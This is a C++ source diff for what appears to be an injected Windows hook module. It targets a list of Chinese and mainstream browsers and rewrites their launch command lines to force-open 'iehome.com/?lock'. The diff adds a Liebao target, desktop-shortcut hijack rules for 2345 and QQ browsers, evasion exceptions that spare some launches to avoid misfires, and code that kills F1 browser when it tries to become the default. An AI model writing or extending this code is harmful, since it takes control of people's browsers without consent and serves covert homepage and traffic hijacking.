@@ -11,6 +11,7 @@ namespace {
 	const wchar_t * ptszHitProcessNameLists[] = {
 		_W("iexplore.exe")/* IE 核心浏览器*/,
 
+		_W("liebao.exe")/* 猎豹 核心浏览器*/,
 		_W("360se.exe")/* 360安全 核心浏览器*/,
 		_W("360chrome.exe")/* 360极速 核心浏览器*/,
 		_W("chrome.exe")/* Chrome 核心浏览器*/,
@@ -35,34 +36,41 @@ namespace {
 
 		_W(".index66.com")
 	};
-	const wchar_t * wcsistr(const wchar_t* pString, const wchar_t* pFind)
-	{
-		wchar_t* char1 = NULL;
-		wchar_t* char2 = NULL;
-		if ((pString == NULL) || (pFind == NULL) || (wcslen(pString) < wcslen(pFind)))
-		{
-			return NULL;
-		}
 
-		for (char1 = (wchar_t*)pString; (*char1) != L'\0'; ++char1)
+	const wchar_t * __cdecl wcsistr(const wchar_t * str1, const wchar_t * str2)
+	{
+		const wchar_t *cp = (const wchar_t *)str1;
+		const wchar_t *s1, *s2;
+		wchar_t c1 = L'\0', c2 = L'\0';
+
+		if (!*str2)
+			return((const wchar_t *)str1);
+
+		while (*cp)
 		{
-			wchar_t* char3 = char1;
-			for (char2 = (wchar_t*)pFind; (*char2) != L'\0' && (*char1) != L'\0'; ++char2, ++char1)
+			s1 = cp;
+			s2 = (const wchar_t *)str2;
+			c1 = (*s1 >= 'a' && *s1 <= 'z') ? *s1 - ('a' - 'A') : *s1;
+			c2 = (*s2 >= 'a' && *s2 <= 'z') ? *s2 - ('a' - 'A') : *s2;
+
+			while (c1 && c2 && !(c1 - c2))
 			{
-				wchar_t c1 = (*char1) & 0xDF;
-				wchar_t c2 = (*char2) & 0xDF;
-				if ((c1 != c2) || (((c1 > 0x5A) || (c1 < 0x41)) && (*char1 != *char2))) // 此处重新编辑了下
-					break;
+				s1++, s2++;
+
+				c1 = (*s1 >= 'a' && *s1 <= 'z') ? *s1 - ('a' - 'A') : *s1;
+				c2 = (*s2 >= 'a' && *s2 <= 'z') ? *s2 - ('a' - 'A') : *s2;
 			}
 
-			if ((*char2) == L'\0')
-				return char3;
+			if (!*s2)
+				return(cp);
 
-			char1 = char3;
+			cp++;
 		}
 
-		return NULL;
+		return(NULL);
+
 	}
+
 	typedef LONG(WINAPI *PNTQUERYINFORMATIONPROCESS)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
 
 	inline PPEB GetCurrentProcessPEB()
@@ -96,10 +104,10 @@ namespace {
 		return dwParentPID;
 	}
 
-	LPCWSTR GetProcessNameByProcessId(DWORD dwProcessID)
+	bool GetProcessNameByProcessId(DWORD dwProcessID, LPWSTR pwszProcessName)
 	{
+		bool bIsFind = false;
 		PROCESSENTRY32W pe32 = { 0 };
-		LPCWSTR pcwszProcessName = NULL;
 		HANDLE hProcessSnap = INVALID_HANDLE_VALUE;
 
 		hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
@@ -113,7 +121,8 @@ namespace {
 		{
 			if (pe32.th32ProcessID == dwProcessID)
 			{
-				pcwszProcessName = pe32.szExeFile;
+				bIsFind = true;
+				wcscpy(pwszProcessName,pe32.szExeFile);
 				break;
 			}
 
@@ -122,7 +131,7 @@ namespace {
 
 		CloseHandle(hProcessSnap);
 
-		return pcwszProcessName;
+		return bIsFind;
 	}
 
 	bool RegRead(HKEY hRootKey, LPCWSTR lpSubKey, LPCWSTR lpValueName, BYTE   * pBuffer, size_t sizeBufferSize)
@@ -179,6 +188,7 @@ namespace {
 
 bool Hook::StartCommandLineHook()
 {
+	bool bIsHookProcess = false;
 	PPEB pProcessPEB = GetCurrentProcessPEB();
 
 	if (NULL == pProcessPEB || NULL == pProcessPEB->ProcessParameters) {
@@ -188,26 +198,31 @@ bool Hook::StartCommandLineHook()
 	LPCWSTR pcwszStartCommandLine = pProcessPEB->ProcessParameters->CommandLine.Buffer;
 	LPCWSTR pcwszStartImagePathName = pProcessPEB->ProcessParameters->ImagePathName.Buffer;
 
+	Global::Log.PrintW(LOGOutputs, L"[% 5u] EXEC: %s", GetCurrentProcessId(), pcwszStartImagePathName);
+
 	for (int i = 0; i < count(ptszHitProcessNameLists); i++) {
+		bIsHookProcess = true;
 		if (NULL != wcsistr(pcwszStartImagePathName, ptszHitProcessNameLists[i])) {
 			break;
 		}
 
-		pcwszStartImagePathName = NULL;
+		bIsHookProcess = false;
 	}
 
-	if (NULL == pcwszStartImagePathName || NULL == pcwszStartCommandLine) {
+	if (false == bIsHookProcess) {
 		return false;
 	}
 
+	WCHAR wszParentProcessName[MAX_PATH + 1] = { 0 };
 	DWORD dwParentProcessID = GetParentProcessId(GetCurrentProcessId());
-	LPCWSTR pcwszParentProcessName = GetProcessNameByProcessId(dwParentProcessID);
 
-	if (-1 == dwParentProcessID || NULL == pcwszParentProcessName) {
+	wszParentProcessName[0] = L'\\';
+	if (-1 == dwParentProcessID || false == GetProcessNameByProcessId(dwParentProcessID, &wszParentProcessName[1])) {
 		return false;
 	}
 
-	if (NULL != wcsistr(pcwszStartImagePathName, pcwszParentProcessName)) {
+	if (NULL != wcsistr(pcwszStartImagePathName, wszParentProcessName)) {
+		Global::Log.PrintW(LOGOutputs, L"[% 5u] Parent Name: %s", GetCurrentProcessId(), wszParentProcessName);
 		return false;
 	}
 
@@ -217,10 +232,8 @@ bool Hook::StartCommandLineHook()
 		return false;
 	}
 
-	LPCWSTR pcwszNewParameter = L"“http://www.iehome.com/?lock”";
-
+	LPCWSTR pcwszNewParameter = L"http://www.iehome.com/?lock";
 	Global::Log.PrintW(LOGOutputs, L"[% 5u] HTTP Association: %s", GetCurrentProcessId(), wszProtocolCommandLine);
-	Global::Log.PrintW(LOGOutputs, L"[% 5u] Start CommandLine: %s", GetCurrentProcessId(), pcwszStartCommandLine);
 
 	bool bIsHit = FindRedirectURL(pcwszStartCommandLine);
 
@@ -228,7 +241,11 @@ bool Hook::StartCommandLineHook()
 		Global::Log.PrintW(LOGOutputs, L"[% 5u] HTTP Association Hit: %s", GetCurrentProcessId(), wszProtocolCommandLine);
 
 		if (NULL == wcsistr(pcwszStartCommandLine, L"http")) {
-			//			IsHit = true; // 由于使用此方法没办法辨别是否是启动默认浏览器,而 QQ空间等不是通过命令行打开而是通过协议打开的. 所以会误判
+			bIsHit = true; // 由于使用此方法没办法辨别是否是启动默认浏览器,而 QQ空间等不是通过命令行打开而是通过协议打开的. 所以会误判
+		}
+
+		if (NULL != wcsistr(pcwszStartCommandLine, L"-")) {
+			bIsHit = false; // 如果默认浏览器通过带参数打开,直接放过
 		}
 
 		if (false == bIsHit) {
@@ -238,22 +255,38 @@ bool Hook::StartCommandLineHook()
 
 	///   编写代理状态监测
 
+	Global::Log.PrintW(LOGOutputs, L"[% 5u] CMD: %s", GetCurrentProcessId(), pcwszStartCommandLine);
+
 	////////////////////////////////////////////////////////////////////////////////////////////
 	// 例外规则
 
 	if (false == bIsHit && NULL != wcsistr(pcwszStartImagePathName, L"\\qqbrowser.exe")) {// QQ浏览器
-		if (NULL != wcsistr(pcwszStartCommandLine, L"-fromqq")) { // QQ 触发的, 如打开空间等
-			pcwszNewParameter = NULL;
-		}
 
-		if (NULL == wcsistr(pcwszStartCommandLine, L"http") && NULL == wcsistr(pcwszStartCommandLine, L"www.")) { // 只要不包含 URL 均不进行劫持
-			pcwszNewParameter = NULL;
+		if (NULL != wcsistr(pcwszStartCommandLine, L"-sc=desktopshortcut")) { // 如果不是桌面图标触发的,按条件放过
+			Global::Log.PrintW(LOGOutputs, L"[% 5u] QQ Desktopshortcut Hit: %s", GetCurrentProcessId(), pcwszStartCommandLine);
+		}
+		else {
+
+			if (NULL != wcsistr(pcwszStartCommandLine, L"-fromqq")) { // QQ 触发的, 如打开空间等
+				pcwszNewParameter = NULL;
+			}
+
+			if (NULL == wcsistr(pcwszStartCommandLine, L"http") && NULL == wcsistr(pcwszStartCommandLine, L"www.")) { // 只要不包含 URL 均不进行劫持
+				pcwszNewParameter = NULL;
+			}
+		}
+	}
+
+	if (false == bIsHit && NULL != wcsistr(pcwszStartImagePathName, L"\\2345explorer.exe")) {// F1浏览器 
+		if (NULL != wcsistr(pcwszStartCommandLine, L"--shortcut=desktop")) { // 通过桌面快捷方式启动
+			pcwszNewParameter = L"http://www.iehome.com/?lock";
+			Global::Log.PrintW(LOGOutputs, L"[% 5u] 2345 Desktopshortcut Hit: %s", GetCurrentProcessId(), pcwszStartCommandLine);
 		}
 	}
 
 	if (false == bIsHit && NULL != wcsistr(pcwszStartImagePathName, L"\\f1browser.exe")) {// F1浏览器 
 		if (NULL != wcsistr(pcwszStartCommandLine, L"set-default")) { // 禁止其设置默认浏览器
-			Global::Log.PrintW(LOGOutputs, L"[% 5u] Terminated CommandLine Exec: %s", GetCurrentProcessId(), wszProtocolCommandLine);
+			Global::Log.PrintW(LOGOutputs, L"[% 5u] Terminated CommandLine Exec: %s", GetCurrentProcessId(), pcwszStartCommandLine);
 			::ExitProcess(0);
 			::TerminateProcess(::GetCurrentProcess(), 0);
 		}
@@ -271,6 +304,8 @@ bool Hook::StartCommandLineHook()
 		bool bIsSuccess = false;
 
 		siStratupInfo.cb = sizeof(STARTUPINFO);
+
+		Global::Log.PrintW(LOGOutputs, L"[% 5u] Redirect CMD: %s", GetCurrentProcessId(), wszProtocolCommandLine);
 
 		if (FALSE == ::CreateProcessW(NULL, wszProtocolCommandLine, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &siStratupInfo, &piProcessInformation)) {
 			return false;
